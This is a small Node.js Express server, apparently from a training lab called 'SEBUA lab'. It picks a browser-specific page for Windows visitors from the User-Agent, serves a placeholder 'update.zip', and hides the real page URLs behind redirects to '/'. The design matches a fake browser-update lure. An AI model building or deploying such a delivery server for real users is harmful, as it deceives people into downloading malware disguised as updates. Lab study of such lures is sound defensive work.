const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const publicDir = path.join(__dirname, 'public');

/**
 * Определение целевой страницы по User-Agent.
 * ВАЖЕН ПОРЯДОК: Edge и Opera содержат "chrome" в UA,
 * поэтому проверяем их раньше Chrome.
 */
function pickPage(uaRaw) {
  const ua = String(uaRaw || '').toLowerCase();

  // Не Windows — сразу unsupported
  if (!ua.includes('windows')) return 'unsupported.html';

  const isEdge    = ua.includes('edg/') || ua.includes('edge/');
  const isOpera   = ua.includes('opr/') || ua.includes('opera');
  const isChrome  = !isEdge && !isOpera && ua.includes('chrome') && ua.includes('safari');
  const isFirefox = ua.includes('firefox');

  if (isEdge)    return 'edge.html';
  if (isChrome)  return 'chrome.html';
  if (isFirefox) return 'firefox.html';

  return 'unsupported.html';
}

// Корень — отдаём нужную страницу, но URL остаётся "/"
app.get('/', (req, res) => {
  res.sendFile(path.join(publicDir, pickPage(req.headers['user-agent'])));
});

// Файл-заглушка
app.get('/update.zip', (req, res) => {
  res.sendFile(path.join(publicDir, 'update.zip'));
});

// Прямой заход на *.html — редирект на "/" (чтобы юзер не видел /chrome.html)
app.get(/\.html$/i, (req, res) => res.redirect('/'));

// Любой неизвестный путь — тоже на "/"
app.get('*', (req, res) => res.redirect('/'));

app.listen(PORT, () => {
  console.log(`SEBUA lab running on http://localhost:${PORT}`);
});